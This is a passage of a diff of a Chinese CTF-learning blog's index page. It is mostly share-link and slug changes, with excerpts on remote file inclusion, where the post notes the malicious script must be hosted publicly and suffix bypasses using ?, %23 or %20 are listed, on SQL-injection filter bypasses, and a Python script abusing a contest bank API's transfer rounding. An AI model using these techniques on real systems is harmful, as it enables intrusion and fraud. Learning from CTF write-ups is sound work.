+<p>PS：这里的aaaaa/jiaoben.php挂自己localhost里的脚本是不好使的，因为对于题目的服务器来说，这里localhost是他的本地而不是我的本地，他是找不到我写在本地的恶意脚本的。因此想要让他执行我写的恶意代码，只能写在一个能在互联网上被访问的网页中（比如github），或者我能把我写的恶意代码上传到他的服务器</p>
 <p>(b)有限制远程文件包含漏洞绕过</p>
 <p>比如<code>&lt;?php include($_GET[&#39;filename&#39;].&quot;.html&quot;);?&gt;</code>这种，可以在jiaoben.php后面加问号(?)，井号(%23)，空格(%20)等尝试绕过</p>
 <p>3.PHP伪协议</p>
@@ -176,7 +380,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="ckhulmi61000640v08s3y1hvt" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="ckih1njmb0007bwv0ela5cx0d" class="article-share-link">Share</a>
       
       
     </footer>
@@ -239,7 +443,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/python%20requests.session()%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8Cbase64%E5%9C%A8%E6%AD%A3%E5%88%99%E4%B8%AD%E7%9A%84%E5%BD%A2%E5%BC%8F/" data-id="ckhulmi5u000240v016jw321p" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/19/python%20requests.session()%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8Cbase64%E5%9C%A8%E6%AD%A3%E5%88%99%E4%B8%AD%E7%9A%84%E5%BD%A2%E5%BC%8F/" data-id="ckih1njm90004bwv0efp2ft7a" class="article-share-link">Share</a>
       
       
     </footer>
@@ -249,9 +453,9 @@
 
 
   
-    <article id="post-0.Hackergame2020-部分题解" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-Hackergame2020-部分题解" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/11/11/0.Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="article-date">
+    <a href="/2020/11/11/Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="article-date">
   <time datetime="2020-11-11T11:39:50.747Z" itemprop="datePublished">2020-11-11</time>
 </a>
     
@@ -263,7 +467,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/11/0.Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">Hackergame2020-部分题解</a>
+      <a class="article-title" href="/2020/11/11/Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">Hackergame2020-部分题解</a>
     </h1>
   
 
@@ -373,15 +577,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url1&#x3D;&quot;http:&#x2F;&#x2F;202.38.93.111:10100&#x2F;api&#x2F;create&quot;</span><br><span class="line">url2&#x3D;&quot;http:&#x2F;&#x2F;202.38.93.111:10100&#x2F;api&#x2F;transfer&quot;</span><br><span class="line">url3&#x3D;&quot;http:&#x2F;&#x2F;202.38.93.111:10100&#x2F;api&#x2F;eat&quot;</span><br><span class="line">headers&#x3D;&#123;&#39;Content-Type&#39;:&#39;application&#x2F;json;charset&#x3D;utf-8&#39;,</span><br><span class="line">      &#39;Authorization&#39;:&#39;Bearer 3373:MEUCIA13wjtuGzRrp7CH40b2rFnPl1ayGL7r4zMz8kEldXwhAiEAuOIrK+iPT5YWmkfslZuumkBvS9GmJECeoPbagqQEC30&#x3D;&#39;&#125;</span><br><span class="line">data1&#x3D;&#123;&quot;type&quot;:&quot;debit&quot;&#125;</span><br><span class="line">for i in range(200):</span><br><span class="line">  r&#x3D;requests.post(url&#x3D;url1,json&#x3D;data1,headers&#x3D;headers)</span><br><span class="line"></span><br><span class="line">r&#x3D;requests.post(url&#x3D;url1,json&#x3D;&#123;&quot;type&quot;:&quot;credit&quot;&#125;,headers&#x3D;headers)</span><br><span class="line">#Q:为什么这里是json而不是data？</span><br><span class="line">A:要看请求头中Content-Type的内容</span><br><span class="line"></span><br><span class="line">for i in range(2,202):</span><br><span class="line">    data2&#x3D;&#123;&quot;src&quot;:202,&quot;dst&quot;:i,&quot;amount&quot;:167&#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url2,json&#x3D;data2,headers&#x3D;headers)</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">    data3&#x3D;&#123;&quot;account&quot;:1&#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url3,json&#x3D;data3,headers&#x3D;headers)</span><br><span class="line">    for j in range(1,202):</span><br><span class="line">        data4&#x3D;&#123;&quot;src&quot;:j,&quot;dst&quot;:202,&quot;amount&quot;:1&#125;</span><br><span class="line">        r&#x3D;requests.post(url&#x3D;url2,json&#x3D;data4,headers&#x3D;headers)</span><br></pre></td></tr></table></figure>
 
 <p>等一小会儿就有flag了QAQ</p>
-<p>*18.永不溢出的计算器</p>
-<p>rsa学起来~</p>
-<p>*19.普通的身份认证器</p>
-<p>挖坑~</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/11/0.Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="ckhulmi64000840v02mac19y4" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/11/Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="ckih1njmi0009bwv0923ug1sz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -475,44 +675,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/31/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80--IP-%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81-%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="ckhulmi63000740v0e0tqhyf2" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-0.有关SSTI漏洞和flask的学习" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/24/0.%E6%9C%89%E5%85%B3SSTI%E6%BC%8F%E6%B4%9E%E5%92%8Cflask%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="article-date">
-  <time datetime="2020-10-24T15:38:32.579Z" itemprop="datePublished">2020-10-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/24/0.%E6%9C%89%E5%85%B3SSTI%E6%BC%8F%E6%B4%9E%E5%92%8Cflask%E7%9A%84%E5%AD%A6%E4%B9%A0/">有关SSTI漏洞和flask的学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>挖坑~</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/24/0.%E6%9C%89%E5%85%B3SSTI%E6%BC%8F%E6%B4%9E%E5%92%8Cflask%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="ckhulmi5i000040v0a8ih7qd4" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/31/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80--IP-%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81-%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="ckih1njmh0008bwv08dwhgfu0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -596,7 +759,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/20/N1CTF-Web%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckhulmi5s000140v081z7abwl" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/20/N1CTF-Web%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckih1njm60001bwv06o7y34yb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -652,7 +815,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/19/%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/" data-id="ckhulmi60000540v01w6t1nor" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/19/%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/" data-id="ckih1njmb0006bwv0aoe04g0s" class="article-share-link">Share</a>
       
       
     </footer>
@@ -712,7 +875,7 @@
 
 
 
-<p>二、绕过</p>
+<p>二、绕过技巧</p>
 <p>很多时候会发现，上面的步骤好像并没有那么顺利。“别黑了”、“stop hacking!”类似这种黑话见到早就不止一次了QAQ。因为现在哪还有那么友好的出题人出题是为了让你按照公式直接秒的，大多时候出题人都设置了白名单过滤，一旦你输入的payload被检测到匹配白名单中的某一项，注入就失败了。下面总结一下见过的白名单过滤以及绕过方法。</p>
 <p>(1)过滤关键字</p>
 <p>比如过滤select/or/union等等。</p>
@@ -759,6 +922,8 @@
 <p>目前只用过updatexml()报错注入QAQ。有关内容在N1CTFWeb那篇文章写的很细了</p>
 <p>直接放个题感受一下吧。。。</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12311408.html">Here！</a></p>
+<p>四、布尔/时间盲注</p>
+<p>在C1CTF2020题解里有详细内容</p>
 <p>目前知道的知识点就这些，之后随缘补充吧233</p>
 <p>参考网站：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hhwu/p/12622048.html">常规步骤参考1</a></p>
@@ -767,7 +932,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckhulmi5y000440v0dxhc9vt0" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckih1njm80002bwv06eof7ayj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -825,7 +990,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/08/%E5%85%B3%E4%BA%8EPHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%BB%86%E8%8A%82/" data-id="ckhulmi5w000340v00h3zar2w" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/08/%E5%85%B3%E4%BA%8EPHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%BB%86%E8%8A%82/" data-id="ckih1njma0005bwv05e8hb2a3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -853,7 +1018,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -866,6 +1031,14 @@
       <ul>
         
           <li>
+            <a href="/2020/12/05/C1CTF2020-WP/">C1CTF2020-题解</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/02/wp-geekchallenge2020/">wp-geekchallenge2020</a>
+          </li>
+        
+          <li>
             <a href="/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">文件包含漏洞和php伪协议</a>
           </li>
         
@@ -874,15 +1047,7 @@
           </li>
         
           <li>
-            <a href="/2020/11/11/0.Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">Hackergame2020-部分题解</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/31/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80--IP-%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81-%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AD%A6%E4%B9%A0/">流量分析基础--IP 子网掩码 默认网关 DNS服务器的学习</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/24/0.%E6%9C%89%E5%85%B3SSTI%E6%BC%8F%E6%B4%9E%E5%92%8Cflask%E7%9A%84%E5%AD%A6%E4%B9%A0/">有关SSTI漏洞和flask的学习</a>
+            <a href="/2020/11/11/Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">Hackergame2020-部分题解</a>
           </li>
         
       </ul>
